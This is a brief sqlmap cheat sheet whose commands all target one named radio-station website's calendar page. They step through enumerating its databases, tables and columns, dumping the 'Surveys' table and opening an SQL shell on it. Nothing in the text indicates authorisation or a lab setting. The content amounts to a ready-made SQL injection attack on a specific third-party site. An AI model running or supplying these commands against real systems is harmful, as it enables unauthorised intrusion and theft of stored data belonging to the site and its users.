#SQLMAP

#installation
sudo apt-get install sqlmap

#getting database
python sqlmap.py -u 'http://www.977thebeach.ca/calendar_details.php?EventID=6121' --dbs

extract tables
python sqlmap.py -u 'http://www.977thebeach.ca/calendar_details.php?EventID=6121' --tables -D bwebmain_central


extract columns
 python sqlmap.py -u 'http://www.977thebeach.ca/calendar_details.php?EventID=6121' --columns -D bwebmain_central -T Surveys


extract data
 python sqlmap.py -u 'http://www.977thebeach.ca/calendar_details.php?EventID=6121' --dump -D bwebmain_central -T Surveys


dump specific data
python sqlmap.py -u 'http://www.977thebeach.ca/calendar_details.php?EventID=6121' --dump --start 88 --stop 90 -D bwebmain_central -T Surveys


--threads =for faster retrieval


entering into sqlshell
 python sqlmap.py -u 'http://www.977thebeach.ca/calendar_details.php?EventID=6121' --sql-shell -D bwebmain_central -T Surveys
